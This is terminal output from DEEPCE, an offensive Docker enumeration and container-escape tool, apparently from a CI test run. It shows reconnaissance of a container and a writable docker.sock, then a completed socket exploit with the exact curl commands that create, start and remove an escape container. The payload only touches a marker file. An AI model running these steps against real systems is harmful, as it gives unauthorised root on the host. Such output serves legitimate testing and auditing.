
[1;90m                      ##[1;37m         .
[1;90m                ## ## ##[1;37m        ==
[1;90m             ## ## ## ##[1;37m       ===
[1;37m         /"""""""""""""""""\___/ ===
[1;34m    ~~~ [1;90m{[1;34m~~ ~~~~ ~~~ ~~~~ ~~~ ~[1;90m /  [1;37m===-[1;34m ~~~[0m
[1;90m         \______ X           __/
[1;90m           \    \         __/
[1;90m            \____\_______/[0m
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \ [1;90m  ENUMERATE[0m
   / /_/ /  __/  __/ /_/ / (__/  __/ [1;90m ESCALATE[0m
   \__,_/\___/\___/ .___/\___/\___/[1;90m  ESCAPE[0m
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

[1;34m==========================================[1;32m( Colors )[1;34m==========================================[0m
[1;33m[+][1;32m Exploit Test ............ [0m[48;5;1mExploitable - Check this out[0m
[1;33m[+][1;32m Basic Test .............. [0m[1;33mPositive Result[0m
[1;33m[+][1;32m Another Test ............ [0m[1;31mError running check[0m
[1;33m[+][1;32m Negative Test ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Multi line test ......... [0m[1;33mYes[0m
[1;90mCommand output
spanning multiple lines[0m

[1;90mTips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See [4mhttps://stealthcopter.github.io/deepce[0m[0m

[1;34m===================================[1;32m( Installing Packages )[1;34m====================================[0m
fetch https://dl-cdn.alpinelinux.org/alpine/v3.14/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.14/community/x86_64/APKINDEX.tar.gz
(1/26) Installing fstrm (0.6.1-r0)
(2/26) Installing krb5-conf (1.0-r2)
(3/26) Installing libcom_err (1.46.2-r0)
(4/26) Installing keyutils-libs (1.6.3-r0)
(5/26) Installing libverto (0.3.2-r0)
(6/26) Installing krb5-libs (1.18.4-r0)
(7/26) Installing json-c (0.15-r1)
(8/26) Installing protobuf-c (1.3.3-r6)
(9/26) Installing libuv (1.41.0-r0)
(10/26) Installing xz-libs (5.2.5-r0)
(11/26) Installing libxml2 (2.9.12-r1)
(12/26) Installing bind-libs (9.16.20-r1)
(13/26) Installing bind-tools (9.16.20-r1)
(14/26) Installing ca-certificates (20191127-r5)
(15/26) Installing brotli-libs (1.0.9-r5)
(16/26) Installing nghttp2-libs (1.43.0-r0)
(17/26) Installing libcurl (7.79.1-r0)
(18/26) Installing curl (7.79.1-r0)
(19/26) Installing libcap (2.50-r0)
(20/26) Installing libgcc (10.3.1_git20210424-r2)
(21/26) Installing lua5.3-libs (5.3.6-r0)
(22/26) Installing libpcap (1.10.0-r0)
(23/26) Installing pcre (8.44-r0)
(24/26) Installing libssh2 (1.9.0-r1)
(25/26) Installing libstdc++ (10.3.1_git20210424-r2)
(26/26) Installing nmap (7.91-r0)
Executing busybox-1.33.1-r6.trigger
Executing ca-certificates-20191127-r5.trigger
OK: 30 MiB in 40 packages
[1;34m===================================[1;32m( Enumerating Platform )[1;34m===================================[0m
[1;33m[+][1;32m Inside Container ........ [0m[1;33mYes[0m
[1;33m[+][1;32m Container Platform ...... [0m[1;33mdocker[0m
[1;33m[+][1;32m Container tools ......... [0m[1;31mNone[0m
[1;33m[+][1;32m User .................... [0m[1;33mroot[0m
[1;33m[+][1;32m Groups .................. [0m[1;90m[1;37m[48;5;1mroot[0m[1;90m bin daemon sys adm disk [1;37m[48;5;1mwheel[0m[1;90m floppy dialout tape video[0m
[1;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m
[1;33m[+][1;32m Docker Sock ............. [0m[1;33mYes[0m
[1;37msrw-rw----    1 root     121            0 Nov 18 18:05 /var/run/docker.sock[0m
[1;33m[+][1;32m Sock is writable ........ [0m[48;5;1mYes[0m
[1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m

[1;90mTo see full info from the docker sock output run the following[0m

[1;90mcurl -s --unix-socket /var/run/docker.sock http://localhost/info[0m

[1;37mKernelVersion:5.11.0-1021-azure
OperatingSystem:Ubuntu 20.04.3 LTS
OSType:linux
Architecture:x86_64
NCPU:2
DockerRootDir:/var/lib/docker
Name:fv-az252-308
ServerVersion:20.10.10+azure-1[0m
[1;33m[+][1;32m Docker Version .......... [0m[1;33m20.10.10+azure-1[0m
[1;33m[+][1;32m CVE–2019–13139 .......... [0m[1;90mNo[0m
[1;33m[+][1;32m CVE–2019–5736 ........... [0m[1;90mNo[0m
[1;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m
[1;33m[+][1;32m Container ID ............ [0m[1;33m61620aeeae3b[0m
[1;33m[+][1;32m Container Full ID ....... [0m[1;33m61620aeeae3b33da6162df08b771dc5d1740f6e29b32aeb2f87d353aad424fc6[0m
[1;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m
[1;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2[0m
[1;33m[+][1;32m DNS Server(s) ........... [0m[1;33m168.63.129.16 [0m
[1;33m[+][1;32m Host IP ................. [0m[1;33m172.17.0.1[0m
[1;33m[+][1;32m Operating System ........ [0m[1;90mLinux[0m
[1;33m[+][1;32m Kernel .................. [0m[1;90m5.11.0-1021-azure[0m
[1;33m[+][1;32m Arch .................... [0m[1;90mx86_64[0m
[1;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz[0m
[1;33m[+][1;32m Useful tools installed .. [0m[1;33mYes[0m
[1;90m/usr/bin/curl
/usr/bin/wget
/usr/bin/nc
/usr/bin/nslookup
/usr/bin/host
/bin/hostname
/usr/bin/dig
/usr/bin/nmap[0m
[1;33m[+][1;32m Dangerous Capabilities .. [0m[1;33mYes[0m
[1;90mCurrent: cap_chown,cap_[1;37m[48;5;1mdac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=eip
Bounding set =cap_chown,cap_[1;37m[48;5;1mdac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Current IAB: cap_chown,cap_[1;37m[48;5;1mdac_override[0m[1;90m,!cap_[1;37m[48;5;1mdac_read_search[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,![1;37m[48;5;1mcap_sys_module[0m[1;90m,!cap_sys_rawio,cap_sys_chroot,![1;37m[48;5;1mcap_sys_ptrace[0m[1;90m,!cap_sys_pacct,![1;37m[48;5;1mcap_sys_admin[0m[1;90m,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore[0m
[1;33m[+][1;32m SSHD Service ............ [0m[1;90mNo[0m
[1;33m[+][1;32m Privileged Mode ......... [0m[1;90mNo[0m
[1;33m[+][1;32m Alpine Linux Version .... [0m[1;33m3.14.3[0m
[1;33m[+][1;32m └── CVE-2019-5021 ....... [0m[1;90mNo[0m
[1;34m====================================[1;32m( Enumerating Mounts )[1;34m====================================[0m
[1;33m[+][1;32m Docker sock mounted ....... [0m[48;5;1mYes[0m
[1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m

[1;33m[+][1;32m Other mounts .............. [0m[1;33mYes[0m
[1;90m/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/root rw,discard[0m
[1;33m[+][1;32m Possible host usernames ... [0m[1;33mrunner [0m
[1;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m
[1;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m
[1;90mHOME=/root
HOSTNAME=61620aeeae3b
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
SHLVL=1[0m
[1;33m[+][1;32m Any common entrypoint files ......... [0m[1;33mYes[0m
[1;90m-rwxr-xr-x    1 1001     121        37.3K Nov 18 18:06 /root/deepce.sh[0m
[1;33m[+][1;32m Interesting files in root ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Passwords in common files ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Home directories .................... [0m[1;90mNo[0m
[1;33m[+][1;32m Hashes in shadow file ............... [0m[1;90mNo permissions[0m
[1;33m[+][1;32m Searching for app dirs .............. [0m
[1;34m==================================[1;32m( Enumerating Containers )[1;34m==================================[0m
[1;90mBy default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further[0m

[1;31m[0mTODO Enumerate container using sock[0m
[1;34m=====================================[1;32m( Exploiting Sock )[1;34m======================================[0m

[1;33m[+][1;32m Preparing Exploit [0m[1;90m [0m
[1;33m[+][1;32m Exploit Type ............. [0m[1;90mCustom Command[0m
[1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
[1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m

[1;33m[+][1;32m Creating container ..... [0m[1;33m9cdd1ec00de30f3d47c4d3a7a364518c920d9c423ed903dc689ac4589ac6e29b[0m
[1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/9cdd1ec00de30f3d47c4d3a7a364518c920d9c423ed903dc689ac4589ac6e29b/start[0m
[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/9cdd1ec00de30f3d47c4d3a7a364518c920d9c423ed903dc689ac4589ac6e29b/logs?stderr=1&stdout=1" --output -[0m
[1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/9cdd1ec00de30f3d47c4d3a7a364518c920d9c423ed903dc689ac4589ac6e29b/stop[0m
[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/9cdd1ec00de30f3d47c4d3a7a364518c920d9c423ed903dc689ac4589ac6e29b[0m
[1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
[1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Exploit completed ..... [0m[1;33m:)[0m
[1;34m===============================================[1;32m[1;34m===============================================[0m
